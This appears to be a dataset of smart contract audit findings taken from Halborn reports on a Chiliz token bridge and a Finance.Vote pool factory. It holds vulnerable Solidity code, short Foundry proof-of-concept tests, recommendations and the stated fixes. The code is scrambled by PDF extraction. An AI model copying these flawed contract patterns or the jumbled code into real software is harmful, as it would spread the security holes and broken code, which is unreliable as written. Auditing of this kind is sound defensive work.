\")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; 12 13 14 15 16  pathByteGG , path , path ); 17 18  \" )); 19  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 20 21 22 23 24 25 26 27  \" )); 28 29 30 31 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); ## Chain operates with chain ID as 1. bridge . deposit { value : 5 e2 }(1 , tokenResource , test ); function testExploit () public { } } bytes memory test = \" \"; bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE Proof of concept Steps:  Set up a token bridge with the same chain-id on both sides of the bridge.  Attempt to transfer tokens across the bridge.  Observe that the tokens become stuck and are not transferred to the destination chain. Risk Level: Likelihood - 5 Impact - 5 32 Recommendation: Based on our analysis, it is recommended the following actions:  Update the implementation of the token bridge to prevent the use of the same chain-id on both sides of the bridge.  Implement a validation step that checks the chain-id of the source and destination chains and ensures that they are different.  Test the updated token bridge to ensure that it is functioning properly and preventing tokens from becoming stuck. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding the chain id validation. Commit ID: 72176b53657bc49d31bfd5f32ef73376505a5935 33 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: Critical"]}, {"title": "LACK OF QUORUM DEFINITION ON THE RELAYERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The lack of a quorum definition on the relayer threshold in this system could potentially result in low participation and lack of consensus This is because without a minimum number of on important decisions. participants required to reach consensus, it is possible for some relayers to make decisions that do not reflect the views of the majority of relayers. This can hinder the effectiveness and efficiency of the system, and can lead to conflicts and disputes among relayers. It is important for the system to define a quorum for the relayer threshold to ensure that sufficient participation is achieved and that decisions are made with the support and consensus of the majority of relayers. This can help to promote collaboration and consensus among relayers and improve the functioning and reliability of the system. Code Location: Bridge.sol#L201 Listing 7 @notice Modifies the number of votes required for a @notice Only callable by an address that currently has the /* * 1 2  proposal to be considered passed . 3  admin role . 4  changed to . 5 6 7  external onlyAdmin { 8 9 10 11 */ } @param newThreshold Value { _relayerThreshold } will be @notice Emits { RelayerThresholdChanged } event . function adminChangeRelayerThreshold ( uint newThreshold ) _relayerThreshold = newThreshold ; emit RelayerThresholdChanged ( newThreshold ); 34 Proof of concept code: Listing 8 function setUp () public { bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 6 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 14 15 16 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28 29 30 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); nativeHandler = new NativeHandler ( address ( bridge ) , bridge . adminSetResource ( address ( nativeHandler ) , function testAdminRelayerThreshold () public { bridge . adminChangeRelayerThreshold (0) ; } } bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE 35 Proof of concept: Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended that the system define a quorum for the relayer threshold to ensure that sufficient participation is achieved and that decisions are made with the support and consensus of the majority of relayers. This can be done by setting a specific minimum number of relayers required to reach consensus on key decisions, or by using a formula or algorithm to dynamically calculate the quorum based on factors such as the total number of active relayers or the value of the decision being made. By defining a quorum for the relayer threshold, the system can help to promote collaboration and consensus among relayers and improve the functioning and reliability of the system. 36 Remediation Plan: SOLVED: The Chiliz team solved the issue by adding the quorum relayer threshold definition. Commit ID: 8a0ffc0bea678f15ec4bcf318740b4170ee3ba95 37 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: High"]}, {"title": "HANDLER SHOULD ACCEPT PAYMENTS THROUGH ONLY BRIDGE CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ability of the handler to accept payments through any user using the receive() function in Solidity in this system could potentially result in loss of funds. To prevent sending funds through the receive() and fallback() functions in Solidity, you can implement checks and safeguards in your contract to ensure that only payments from specific approved con- tracts are accepted. This can be done by specifying a list of approved contracts that are allowed to send funds to your contract, and by imple- menting appropriate checks to verify that the sender of the payment is one of these approved contracts. For example, you can use the msg.sender variable in Solidity to check the sender of the payment, and only accept payments from the approved contracts. You can also use the require() function to enforce these checks and prevent payments from unauthorized contracts from being accepted. It is important to carefully review and test your contract to ensure that it properly implements these checks and safeguards. Code Location: NativeHandler.sol#L187 Listing 9 1 receive () external payable { } 38 Proof of concept: Proof of concept: Listing 10 function setUp () public { 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 CheatCodes cheats = CheatCodes (0 6  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 14 15 16 address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; 39 bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE bridge . adminSetResource ( address ( nativeHandler ) , nativeHandler = new NativeHandler ( address ( bridge ) , 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28 29 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); function testHandlerDepositDirectly () public { address ( nativeHandler ). transfer (5000 ether ); } } Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended that the system implement checks and safeguards to restrict the handler to only accept payments through bridge contract using the receive() function in Solidity. This can be done by specifying a list of approved contracts that are allowed to send funds to the handler, and by implementing appropriate checks to verify that the sender of the payment is one of these approved contracts. For example, the contract can use the msg.sender variable in Solidity to check the sender of the payment, and only accept payments from the approved contracts. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a necessary check in the handler. 40 Commit ID: 49e3c75605632664540b946df8bda7892fc7e884 41 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: High"]}, {"title": "LACK OF REFUND MECHANISM FOR OVERPAYMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "ERC20Handler contract handles ERC20 deposits and deposit executions. In the given code, the deposit function allows users to deposit native tokens, but it does not include any mechanism for refunding the user if they accidentally send more tokens than required when interacting with ERC20Handler. If a user accidentally sends more native tokens than required, they will lose their excess funds without any way to recover them. This can lead to user dissatisfaction and a loss of trust in the contract. Additionally, the contract may be at risk of attack from users who deliberately attempt to overpay in order to steal the excess funds. Code Location: Bridge.sol#L308 Listing 11 function deposit ( uint8 destinationChainID , bytes32 resourceID , address handler = _resourceIDToHandlerAddress [ resourceID ]; require ( handler != address (0) , \" resourceID not mapped to require ( msg . value >= _fee , \" invalid value \"); 1  bytes calldata data ) external payable whenNotPaused { 2 3 4 5  handler \" ); 6 7  ]; 8 9 10 11 12 13 14 15 uint256 valueToSend = msg . value - _fee ; if ( valueToSend > 0) { payable ( handler ). transfer ( valueToSend ); } uint64 depositNonce = ++ _depositCounts [ destinationChainID _depositRecords [ depositNonce ][ destinationChainID ] = data ; IDepositExecute depositHandler = IDepositExecute ( handler ); if ( msg . value > 0) { 42 } depositHandler . deposit ( resourceID , destinationChainID , 16 17  depositNonce , msg . sender , data ); 18 19  ; 20 21 } emit Deposit ( destinationChainID , resourceID , depositNonce ) Proof of concept: Listing 12 1 2 3  )); 4 5 function testRefund () public { bytes memory test = \" \"; bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" ERC20 \" bridge . deposit { value : 5 e2 }(111 , tokenResource , test ); } Risk Level: Likelihood - 3 Impact - 5 Recommendation: To address this issue, the deposit function should include a mechanism for refunding the user if they accidentally send more native tokens than required. This can be implemented by checking the amount of tokens received in the deposit function and refunding the excess amount to the user using the transfer function. This will ensure that users are protected from losing their funds due to overpayment, and will help to maintain trust in the contract. 43 Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a refund mechanism in the related handler. Commit ID: 369bb8ba9926ad704e8aebd2692f03d9f343021e 44 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: High"]}, {"title": "IMPROPER UPPER BOUND ON THE FEE DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The improper definition of an upper bound on fees in this system could potentially result in excessive fees and harm the user experience. This is because the upper bound is not adequately constrained, and it is possible for fees to be set at levels that are much higher than expected or reasonable. This can create a financial burden for users and discourage In addition, excessive fees can also lead to the use of the system. centralization and concentration of power in the hands of those who can afford to pay high fees, which can create additional security and integrity risks for the system. It is important for the system to properly define the upper bound on fees to ensure that fees are not set at excessive levels and to protect the user experience and the security of the system. Code Location: Bridge.sol#L298 Listing 13 1 2 3 4 5 6 7  ; 8 9 /* * */ @notice Changes deposit fee . @notice Only callable by admin . @param newFee Value { _fee } will be updated to . function adminChangeFee ( uint newFee ) external onlyAdmin { require ( _fee != newFee , \" Current fee is equal to new fee \" ) _fee = newFee ; } 45 Proof of concept code: Listing 14 function setUp () public { bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 6 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 14 15 16 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28 29 30 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); nativeHandler = new NativeHandler ( address ( bridge ) , bridge . adminChangeFee (1000000000000000000000000) ; bridge . adminSetResource ( address ( nativeHandler ) , function testFee () public { } } bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE 46 Proof of concept: Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended that the system properly define the upper bound on fees to ensure that fees are not set at excessive levels and to protect the user experience. This can be done by setting a specific maximum limit on fees, or by using a formula or algorithm to dynamically calculate the maximum fee based on factors such as the current market conditions or the value of the transaction. By properly defining the upper bound on fees, the system can help to prevent excessive fees and improve the user experience. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding an upper limit to the fee. 47 Commit ID: d715e18b47b17b63d3b0fdeb51dade1b18e535ee 48 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: Medium"]}, {"title": "USE CALL INSTEAD OF TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The transfer function is not recommended for sending native token due to its, 2300 gas unit limit. Instead, call can be used to circumvent the gas limit. Code Location: Bridge.sol#L308 Listing 15 function deposit ( uint8 destinationChainID , bytes32 resourceID , address handler = _resourceIDToHandlerAddress [ resourceID ]; require ( handler != address (0) , \" resourceID not mapped to uint64 depositNonce = ++ _depositCounts [ destinationChainID _depositRecords [ depositNonce ][ destinationChainID ] = data ; IDepositExecute depositHandler = IDepositExecute ( handler ); if ( msg . value > 0) { require ( msg . value >= _fee , \" invalid value \"); 1  bytes calldata data ) external payable whenNotPaused { 2 3 4 5  handler \" ); 6 7  ]; 8 9 10 11 12 13 14 15 16 17  depositNonce , msg . sender , data ); 18 19  ; 20 uint256 valueToSend = msg . value - _fee ; if ( valueToSend > 0) { payable ( handler ). transfer ( valueToSend ); } } } depositHandler . deposit ( resourceID , destinationChainID , emit Deposit ( destinationChainID , resourceID , depositNonce ) 49 21 Risk Level: Likelihood - 2 Impact - 4 Recommendation: Use call instead of transfer for sending native token. Remediation Plan: SOLVED: The Chiliz team solved the issue by changing the call transfer function. Commit ID: 0976828419dbaa9feabfa017a1032c4203abf6da 50 3.10 (HAL-10) MISSING REENTRANCY GUARD - LOW ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: Informational"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Calling external contracts is dangerous if some functions and variables are called after the external call. An attacker could use a malicious contract to perform a recursive call before calling function and take over the control flow. Code Location: BasicPoolFactory.sol Line #~112 Listing 1: BasicPoolFactory.sol (Lines 112) 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( block . timestamp > pool . startTime , ' Cannot deposit before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; } IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; 13 121 122 123 124 emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: As possible, external calls should be at the end of the function in order to to avoiding an attacker take over the control flow. If not possible, deploy some locking mechanism, like the commonly known ReentrancyGuard Make sure that any pair of code paths that have a possible instead. read/write conflict for a variable will be reentrancy guarded. Remediation Plan: SOLVED: Finance.Vote Team moved an external call to the end of the function. Listing 2: BasicPoolFactory.sol (Lines 123) 105 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; 106 require ( pool . id == poolId , ' Uninitialized pool '); 107 require ( block . timestamp > pool . startTime , ' Cannot deposit 108 109 110 111 112 before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; 14 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 } pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; bool success = IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); require ( success , ' Token transfer failed '); emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; } 15 ", "labels": ["Halborn", "Finance_Vote_BasicPoolFactory", "Severity: Low"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "BasicPoolFactory.sol contract is missing a safety check inside their constructors and multiple functions. Setters of address type parameters should include a zero-address check otherwise contract functionality may become inaccessible or tokens burnt forever. Code Location: BasicPoolFactory.sol Line #~48 Listing 3: BasicPoolFactory.sol (Lines ) 48 49 50 51 52 53 54 55 56 57 constructor ( address mgmt ) { management = mgmt ; } // change the management key function setManagement ( address newMgmt ) public managementOnly { address oldMgmt = management ; management = newMgmt ; emit ManagementUpdated ( oldMgmt , newMgmt ); } Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: 16 Listing 4: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without address validation. 17 ", "labels": ["Halborn", "Finance_Vote_BasicPoolFactory", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the BasicPoolFactory.sol contract the function does not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: BasicPoolFactory.sol Line #~48 Listing 5: BasicPoolFactory.sol (Lines ) 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; 18 79 80 81 82 } } pool . maximumDeposit = maxDeposit ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED: Finance.Vote Team added event at the end of the function. Listing 6: BasicPoolFactory.sol (Lines 83) 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) external managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token 19 arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; } pool . maximumDeposit = maxDeposit ; emit PoolAdded ( pool . id ); } 76 77 78 79 80 81 82 83 84 85 20 ", "labels": ["Halborn", "Finance_Vote_BasicPoolFactory", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block .timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Listing 7: BasicPoolFactory.sol (Lines 149) uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly { 148 function addPool ( 149 150 151 152 153 154 155 156 157 158 159 160 numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; } 161 162 163 164 165 166 167 168 169 21 pool . maximumDeposit = maxDeposit ; 170 171 172 } Listing 8: BasicPoolFactory.sol (Lines 54) 53 function getRewards ( uint poolId , uint receiptId ) public view returns ( uint [] memory ) { 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 } Pool storage pool = pools [ poolId ]; Receipt memory receipt = pool . receipts [ receiptId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( receipt . id == receiptId , ' Uninitialized receipt '); uint nowish = block . timestamp ; if ( nowish > pool . endTime ) { nowish = pool . endTime ; } uint secondsDiff = nowish . minus ( receipt . timeDeposited ); uint [] memory rewardsLocal = new uint []( pool . rewardsPerSecondPerToken . length ); for ( uint i = 0; i < pool . rewardsPerSecondPerToken . length ; i ++) { rewardsLocal [ i ] = ( secondsDiff . times ( pool . rewardsPerSecondPerToken [ i ]) . times ( receipt . amountDeposited )) / 1 e18 ; } return rewardsLocal ; Listing 9: BasicPoolFactory.sol (Lines 25) 24 function withdrawExcessRewards ( uint poolId ) external { Pool storage pool = pools [ poolId ]; 25 require ( pool . id == poolId , ' Uninitialized pool '); 26 require ( pool . totalDeposits == 0 , ' Cannot withdraw until 27 28 29 30 31 32 all deposits are withdrawn '); require ( block . timestamp > pool . endTime , ' Contract must reach maturity '); for ( uint i = 0; i < pool . rewardTokens . length ; i ++) { IERC20 rewardToken = IERC20 ( pool . rewardTokens [i ]) ; uint rewards = rewardToken . balanceOf ( address ( this )); 22 rewardToken . transfer ( management , rewards ); } IERC20 depositToken = IERC20 ( pool . depositToken ); depositToken . transfer ( management , depositToken . balanceOf ( address ( this )) ); emit ExcessRewardsWithdrawn ( poolId ); 33 34 35 36 37 38 39 } Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue with block.timestamp 23 ", "labels": ["Halborn", "Finance_Vote_BasicPoolFactory", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the BasicPoolFactory contract, there are a few instances where the multiple methods are called and the return value (bool) is ignored. BasicPoolFactory.sol Line #~103,125,147 Listing 10: BasicPoolFactory.sol (Lines 112) 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( block . timestamp > pool . startTime , ' Cannot deposit before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; } IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; 24 123 124 } Listing 11: BasicPoolFactory.sol (Lines 154,158) function withdrawExcessRewards ( uint poolId ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( pool . totalDeposits == 0 , ' Cannot withdraw until all deposits are withdrawn '); require ( block . timestamp > pool . endTime , ' Contract must reach maturity '); for ( uint i = 0; i < pool . rewardTokens . length ; i ++) { IERC20 rewardToken = IERC20 ( pool . rewardTokens [i ]) ; uint rewards = rewardToken . balanceOf ( address ( this )); rewardToken . transfer ( management , rewards ); } IERC20 depositToken = IERC20 ( pool . depositToken ); depositToken . transfer ( management , depositToken . balanceOf ( address ( this )) ); emit ExcessRewardsWithdrawn ( poolId ); } 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 Listing 12: BasicPoolFactory.sol (Lines 141,143) 125 126 127 128 129 130 131 132 133 134 135 136 function withdraw ( uint poolId , uint receiptId ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); Receipt storage receipt = pool . receipts [ receiptId ]; require ( receipt . id == receiptId , ' Can only withdraw real receipts '); require ( receipt . owner == msg . sender || block . timestamp > pool . endTime , ' Can only withdraw your own deposit '); require ( receipt . timeWithdrawn == 0 , ' Can only withdraw once per receipt '); // close re - entry gate receipt . timeWithdrawn = block . timestamp ; uint [] memory rewards = getRewards ( poolId , receiptId ); 25 pool . totalDeposits = pool . totalDeposits . minus ( receipt . amountDeposited ); for ( uint i = 0; i < rewards . length ; i ++) { pool . rewardsClaimed [ i] = pool . rewardsClaimed [ i ]. plus ( rewards [ i ]) ; IERC20 ( pool . rewardTokens [ i ]) . transfer ( receipt . owner , rewards [ i ]) ; } IERC20 ( pool . depositToken ). transfer ( receipt . owner , receipt . amountDeposited ); emit WithdrawalOccurred ( poolId , receiptId , receipt . owner ); 137 138 139 140 141 142 143 144 145 146 } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a return value check to avoid an unexpected crash of the contract. Return value checks provide better exception handling. Remediation Plan: SOLVED: Finance.Vote Team checked return values on the external calls. Listing 13: BasicPoolFactory.sol (Lines 123) 105 106 107 108 109 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( block . timestamp > pool . startTime , ' Cannot deposit before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); 26 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; } pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; bool success = IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); require ( success , ' Token transfer failed '); emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; } 27 ", "labels": ["Halborn", "Finance_Vote_BasicPoolFactory", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 14: BasicPoolFactory.sol (Lines ) 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; 28 79 80 81 82 } } pool . maximumDeposit = maxDeposit ; 